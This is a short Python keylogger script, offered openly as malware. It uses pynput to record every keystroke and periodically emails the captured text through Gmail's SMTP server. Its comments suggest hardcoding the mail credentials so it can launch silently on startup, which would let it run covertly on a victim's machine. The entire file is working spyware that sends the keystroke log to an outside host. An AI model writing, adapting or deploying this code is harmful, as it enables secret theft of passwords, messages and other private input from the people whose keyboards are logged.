import getpass
import smtplib
from pynput.keyboard import Key, Listener

#set up email
email =  input('Enter email: ')
password = getpass.getpass(prompt='Password: ', stream=None)

# put the above code in comments and hardcode the email and password to not have
# enter inputs during keylogger launch on startup
#email = ''
#password = ''

server = smtplib.SMTP_SSL('smtp.gmail.com',465)
server.login(email, password)

# logger
full_log = ''
word = ''
email_char_limit = 50

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or Key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) > email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    
    if key == Key.esc:
        return False
        
def send_log():
    server.sendmail(
    email,
    email,
    full_log
    )

with Listener( on_press=on_press) as Listener:
    Listener.join()
    
